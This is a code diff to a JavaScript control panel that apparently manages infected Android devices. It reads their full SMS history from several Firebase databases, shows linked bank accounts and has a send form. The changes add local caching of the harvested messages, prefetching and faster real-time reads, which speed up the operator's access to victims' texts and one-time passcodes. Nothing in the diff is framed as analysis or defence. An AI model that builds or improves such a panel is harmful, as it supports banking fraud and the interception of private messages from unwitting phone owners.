@@ -427,6 +427,9 @@ var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var firebaseConfigUpdated=0;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
 var deviceSmsCache={}, _smsLoadSeq=0;
+var SMS_CACHE_KEY='rbl_sms_cache';
+var SMS_CACHE_MAX=100;
+var _smsPersistTimer=null;
 var devFilterMode='all', deviceBankCache={};
 var DEVICE_TOGGLE_KEY='rbl_device_toggles';
 var deviceToggleState={};
@@ -485,6 +488,14 @@ function bindDevListEvents(){
     var id=card.getAttribute('data-dev-id');
     if(id)selectDevice(id);
   });
+  el.addEventListener('touchstart',function(e){
+    var card=e.target.closest('.dev-card');
+    if(!card)return;
+    var id=card.getAttribute('data-dev-id');
+    if(!id)return;
+    var dev=allDevs.find(function(x){return x.id===id;});
+    if(dev)prefetchSmsForDevice(dev);
+  },{passive:true});
 }
 function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
 function makeDevKey(fbId,devId){return fbId+'::'+devId;}
@@ -819,7 +830,7 @@ function renderDevices(){
 function selectDevice(id){
   selDev=id;
   showSmsForSelectedDevice();
-  renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();renderBankAccounts();
+  renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice(true);renderBankAccounts();
   switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
 }
 
@@ -885,9 +896,42 @@ function smsBelongsToDevice(m,d){
 function filterSmsForDevice(list,d){
   return (list||[]).filter(function(s){return smsBelongsToDevice(s,d);});
 }
+function loadSmsCacheFromStorage(){
+  try{
+    var s=localStorage.getItem(SMS_CACHE_KEY);
+    if(!s)return;
+    var data=JSON.parse(s);
+    if(!data||typeof data!=='object')return;
+    Object.keys(data).forEach(function(k){
+      if(data[k]&&Array.isArray(data[k].list)&&data[k].list.length) deviceSmsCache[k]=data[k];
+    });
+  }catch(e){}
+}
+function persistSmsCacheSoon(){
+  if(_smsPersistTimer)clearTimeout(_smsPersistTimer);
+  _smsPersistTimer=setTimeout(function(){
+    try{
+      var out={}, k, c;
+      for(k in deviceSmsCache){
+        c=deviceSmsCache[k];
+        if(c&&c.list&&c.list.length) out[k]={list:c.list.slice(0,SMS_CACHE_MAX),at:c.at||Date.now()};
+      }
+      localStorage.setItem(SMS_CACHE_KEY,JSON.stringify(out));
+    }catch(e){}
+  },300);
+}
+function prefetchSmsForDevice(d){
+  if(!d||deviceSmsCache[d.id]&&deviceSmsCache[d.id].list&&deviceSmsCache[d.id].list.length)return;
+  var inst=getFbInstance(d.fbId);
+  if(!inst)return;
+  fetchSmsFast(inst,d).then(function(list){
+    if(list&&list.length&&!deviceSmsCache[d.id]) setDeviceSms(d.id,list);
+  });
+}
 function setDeviceSms(devId,list){
   var sms=(list||[]).slice().sort(function(a,b){return (b.ts||0)-(a.ts||0);});
   deviceSmsCache[devId]={list:sms,at:Date.now()};
+  persistSmsCacheSoon();
   if(selDev===devId){
     window_allSms=sms;
     window_sms=sms.slice(0,80);
@@ -916,6 +960,29 @@ function clearListeners(){
     else if(L.db&&L.ref&&L.h){try{L.ref.off('value',L.h);}catch(e){}}
   });
   activeListeners={};
+}
+
+/** Schema-aware fast paths — hit these first for sub-100ms SMS load */
+function smsPrimaryPaths(d,inst){
+  var id=d.rawId, schema=(inst&&inst.schema)||'rabel', node=d.deviceNode||'clients', paths=[];
+  if(!id)return paths;
+  if(schema==='spinplay'){
+    ['devices',node,'clients'].forEach(function(n){
+      if(!n)return;
+      var p=n+'/'+id+'/all_sms';
+      if(paths.indexOf(p)<0)paths.push(p);
+    });
+    paths.push('devices/'+id+'/new_sms');
+    paths.push('messages/'+id);
+  }else{
+    paths.push('messages/'+id);
+    [node,'clients','devices'].forEach(function(n){
+      if(!n)return;
+      var p=n+'/'+id+'/all_sms';
+      if(paths.indexOf(p)<0)paths.push(p);
+    });
+  }
+  return paths;
 }
 
 /** All known SMS paths — rebel.py uses messages/{id}; SpinPlay uses devices/.../all_sms */
@@ -949,6 +1016,26 @@ function mergeSmsLists(){
   return merged;
 }
 
+function parseSmsRaw(data){
+  if(!data||isFirebaseErr(data))return [];
+  return smsAsList(data).map(normalizeSms).filter(Boolean);
+}
+
+function fetchSmsFast(inst,d){
+  if(!inst||!d)return Promise.resolve([]);
+  var paths=smsPrimaryPaths(d,inst), i=0;
+  function tryNext(){
+    if(i>=paths.length)return Promise.resolve([]);
+    var p=paths[i++];
+    return restJsonInst(inst,p).then(function(data){
+      var list=parseSmsRaw(data);
+      if(list.length)return list;
+      return tryNext();
+    }).catch(function(){return tryNext();});
+  }
+  return tryNext();
+}
+
 function fetchSmsFromPathsDirect(inst,d){
   if(!inst||!d)return Promise.resolve([]);
   var paths=smsPathsForDevice(d);
@@ -965,55 +1052,63 @@ function fetchSmsFromPathsDirect(inst,d){
 }
 function fetchSmsFromPaths(inst,d){
   if(!inst||!d)return Promise.resolve([]);
-  var hdr={'Content-Type':'application/json'};
-  var apk=rebelApkHeaders();
-  for(var k in apk)hdr[k]=apk[k];
-  return fetch(FETCH_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify({
-    device_id:d.rawId,
-    composite_id:d.id,
-    database_url:inst.restUrl,
-    auth_key:getFbAuthKey(inst),
-    schema:inst.schema||'rabel',
-    device_node:d.deviceNode||'clients'
-  }),cache:'no-store'}).then(function(r){return r.json();}).then(function(res){
-    if(res&&res.ok&&Array.isArray(res.messages)&&res.messages.length)return res.messages;
-    return fetchSmsFromPathsDirect(inst,d);
-  }).catch(function(){
-    return fetchSmsFromPathsDirect(inst,d);
+  var fast=fetchSmsFast(inst,d);
+  var full=fetchSmsFromPathsDirect(inst,d);
+  return fast.then(function(list){
+    if(list.length){
+      full.then(function(merged){if(merged.length)setDeviceSms(d.id,merged);});
+      return list;
+    }
+    return full;
   });
 }
 
-function loadSmsForDevice(){
+function loadSmsForDevice(force){
   var d=getSelDev();if(!d)return;
-  var devId=d.id, seq=++_smsLoadSeq;
+  var devId=d.id;
   document.getElementById('smsEmpty').classList.add('hidden');
   showSmsForSelectedDevice();
+  renderSms();
+
+  if(!force&&activeListeners[devId]&&activeListeners[devId].devId===devId){
+    if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length){
+      var inst0=getFbInstance(d.fbId);
+      if(inst0) fetchSmsFast(inst0,d).then(function(list){if(list.length)setDeviceSms(devId,list);});
+    }
+    return;
+  }
+
+  var seq=++_smsLoadSeq;
   clearListeners();
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase project not found',false);return;}
 
   function applySmsList(list){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
-    setDeviceSms(devId,list||[]);
+    if(list&&list.length) setDeviceSms(devId,list);
+    else if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length) setDeviceSms(devId,[]);
   }
 
   function poll(){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
-    fetchSmsFromPaths(inst,d).then(applySmsList).catch(function(){applySmsList([]);});
+    fetchSmsFast(inst,d).then(applySmsList);
+    fetchSmsFromPathsDirect(inst,d).then(applySmsList);
   }
 
   poll();
-  var timer=setInterval(poll,3500);
+  var timer=setInterval(poll,8000);
   var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq};
 
   if(inst.db){
-    smsPathsForDevice(d).slice(0,4).forEach(function(p){
+    smsPrimaryPaths(d,inst).slice(0,3).forEach(function(path){
       try{
-        var ref=inst.db.ref(p);
+        var ref=inst.db.ref(path);
         try{ref=ref.limitToLast(100);}catch(e2){}
-        var h=function(){
+        var h=function(snap){
           if(seq!==_smsLoadSeq||selDev!==devId)return;
-          fetchSmsFromPaths(inst,d).then(applySmsList);
+          if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
+          var val=typeof snap.val==='function'?snap.val():snap;
+          applySmsList(parseSmsRaw(val));
         };
         ref.on('value',h);
         listeners.refs.push({ref:ref,h:h});
@@ -1286,7 +1381,11 @@ function switchTab(name,btn){
   document.getElementById('screen-'+name).classList.add('active');
   document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
   if(btn)btn.classList.add('active');
-  if(name==='sms'&&selDev)loadSmsForDevice();
+  if(name==='sms'&&selDev){
+    showSmsForSelectedDevice();
+    renderSms();
+    loadSmsForDevice(false);
+  }
   if(name==='device')renderDeviceView();
   if(name==='send')updateSendForm();
   if(name==='bank'&&selDev)renderBankAccounts();
@@ -1337,6 +1436,7 @@ function useSelForAutoToken(){
   try{
     bindDevListEvents();
     loadDeviceToggles();
+    loadSmsCacheFromStorage();
     initFirebase(true).then(function(){
       panelReady=true;
       return fetchAllData();
